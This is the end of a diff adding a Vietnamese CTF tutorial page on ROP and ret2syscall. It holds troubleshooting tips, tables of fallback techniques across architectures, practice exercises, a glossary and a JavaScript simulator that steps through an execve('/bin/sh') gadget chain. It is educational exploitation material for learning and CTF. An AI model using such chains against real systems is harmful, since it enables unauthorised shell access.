+    <div class="card"><h4>movaps khi gọi system</h4><p>Căn rsp 0x10 bằng gadget ret (syscall thuần không cần).</p></div>
+    <div class="card"><h4>Không đủ gadget</h4><p>Dùng <a href="ret2csu.html">ret2csu</a> set rdx, hoặc <a href="ret2dlresolve.html">ret2dlresolve</a>.</p></div>
+    <div class="card"><h4>Null byte cắt payload</h4><p>Nếu nhập bằng scanf %s: địa chỉ có null bị cắt. Dùng read.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 Biến thể -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / BIẾN THỂ & KIẾN TRÚC</div>
+  <h2>x86 / ARM, và khi thiếu gadget</h2>
+  <div class="tablewrap"><table>
+    <thead><tr><th>Kiến trúc</th><th>Đặt đối số</th><th>syscall</th></tr></thead>
+    <tbody>
+      <tr><td>x86-64</td><td>pop rdi/rsi/rdx; rax=nr</td><td><code>syscall</code></td></tr>
+      <tr><td>x86 (32-bit)</td><td>đối số trên stack; eax=nr, ebx/ecx/edx qua pop</td><td><code>int 0x80</code></td></tr>
+      <tr><td>ARM / AArch64</td><td>pop {r0-r2} / gadget ldr; nr trong r7/x8</td><td><code>svc #0</code></td></tr>
+    </tbody>
+  </table></div>
+  <div class="tablewrap"><table>
+    <thead><tr><th>Thiếu gì</th><th>Giải pháp</th></tr></thead>
+    <tbody>
+      <tr><td>Không có pop rdx</td><td><a href="ret2csu.html">ret2csu</a> (csu gadget set rdx)</td></tr>
+      <tr><td>Không có hàm leak / libc</td><td><a href="ret2dlresolve.html">ret2dlresolve</a></td></tr>
+      <tr><td>Buffer quá nhỏ cho chain</td><td><a href="stack_pivot.html">stack pivot</a> sang bss</td></tr>
+      <tr><td>Chỉ có sigreturn</td><td><a href="srop.html">SROP</a></td></tr>
+    </tbody>
+  </table></div>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LUYỆN TẬP</div>
+  <h2>Bài tập tăng dần</h2>
+  <div class="ex"><div class="level">⭐⭐ · execve có sẵn /bin/sh</div><p>Static binary có "/bin/sh": dựng chuỗi syscall execve bằng tay.</p></div>
+  <div class="ex"><div class="level">⭐⭐⭐ · Ghi /bin/sh vào bss</div><p>Không có chuỗi: read syscall ghi vào bss, rồi execve(bss).</p></div>
+  <div class="ex"><div class="level">⭐⭐⭐⭐ · Gadget bẩn</div><p>Chỉ có pop rsi; pop r15; ret và mov [rdi],rax: dựng write-what-where + execve.</p></div>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / THUẬT NGỮ & ĐỌC THÊM</div>
+  <h2>Tra cứu nhanh</h2>
+  <div class="grid">
+    <div class="card"><div class="term">ROP</div><p>Lập trình bằng gadget.</p></div>
+    <div class="card"><div class="term">gadget</div><p>Vài lệnh kết thúc ret.</p></div>
+    <div class="card"><div class="term">ROP chain</div><p>Dãy gadget+hằng trên stack.</p></div>
+    <div class="card"><div class="term">syscall</div><p>Gọi kernel (rax=nr).</p></div>
+    <div class="card"><div class="term">gadget bẩn</div><p>Pop nhiều reg → ăn thêm hằng.</p></div>
+    <div class="card"><div class="term">write-what-where</div><p>mov [rdi],rax: ghi tùy ý.</p></div>
+    <div class="card"><div class="term">SYS_execve</div><p>59 (x86-64).</p></div>
+    <div class="card"><div class="term">r.dump()</div><p>pwntools in bố cục chain.</p></div>
+  </div>
+  <h3>Đọc thêm</h3>
+  <ul>
+    <li>Nền: <a href="ret2libc.html">ret2libc</a>. Tiếp: <a href="ret2csu.html">ret2csu</a> · <a href="ret2syscall_mprotect.html">ret2syscall/mprotect</a> · <a href="stack_pivot.html">stack_pivot</a> · <a href="srop.html">SROP</a>.</li>
+    <li>Shacham "The Geometry of Innocent Flesh on the Bone" (ROP paper) · pwntools ROP docs.</li>
+  </ul>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p><strong>Phase 2 · Bài 7.</strong> ROP = stack đầy địa chỉ gadget; mỗi ret chạy một gadget, pop nạp hằng. execve: rax=59, rdi=&"/bin/sh", rsi=rdx=0, syscall. Tiếp theo: ret2csu (set rdx khi thiếu gadget).</p>
+    <p style="margin-top:6px;opacity:.7">Chỉ dùng cho học tập và CTF hợp pháp.</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("rop-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("rop-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+
+  // gadget sim — stack of (op, val)
+  var chain=[
+    {op:"pop rax; ret", reg:"rax", val:"59"},
+    {op:"pop rdi; ret", reg:"rdi", val:"0x4c0f43 (\"/bin/sh\")"},
+    {op:"pop rsi; ret", reg:"rsi", val:"0"},
+    {op:"pop rdx; ret", reg:"rdx", val:"0"},
+    {op:"syscall", reg:null, val:null}
+  ];
+  var regs={rax:"?",rdi:"?",rsi:"?",rdx:"?",rip:"(bắt đầu)",rsp:"chain[0]"};
+  var ip=0;
+  var regsEl=document.getElementById("regs"),curEl=document.getElementById("cur");
+  function render(){
+    regsEl.innerHTML=["rax","rdi","rsi","rdx","rip","rsp"].map(function(k){
+      return '<div class="reg"><b>'+k+'</b> = '+regs[k]+'</div>';
+    }).join("");
+    if(ip<chain.length) curEl.textContent="Kế tiếp: "+chain[ip].op;
+    else curEl.textContent="✸ syscall(rax=59) → execve(\"/bin/sh\",0,0) → SHELL!";
+  }
+  function step(){
+    if(ip>=chain.length)return;
+    var g=chain[ip];
+    if(g.reg){ regs[g.reg]=g.val; regs.rip=g.op; regs.rsp="chain["+(ip+1)+"]"; }
+    else { regs.rip="syscall"; }
+    ip++; render();
+  }
+  document.getElementById("stepb").addEventListener("click",step);
+  document.getElementById("resetb").addEventListener("click",function(){
+    regs={rax:"?",rdi:"?",rsi:"?",rdx:"?",rip:"(bắt đầu)",rsp:"chain[0]"};ip=0;render();
+  });
+  render();
+
+  var tabs=[].slice.call(document.querySelectorAll("#tabs .tab"));
+  var panels={a:document.getElementById("panel-a"),b:document.getElementById("panel-b"),c:document.getElementById("panel-c")};
+  tabs.forEach(function(t){t.addEventListener("click",function(){
+    tabs.forEach(function(x){x.classList.remove("active");});t.classList.add("active");
+    Object.keys(panels).forEach(function(k){panels[k].hidden=(k!==t.getAttribute("data-t"));});
+  });});
+})();
+</script>
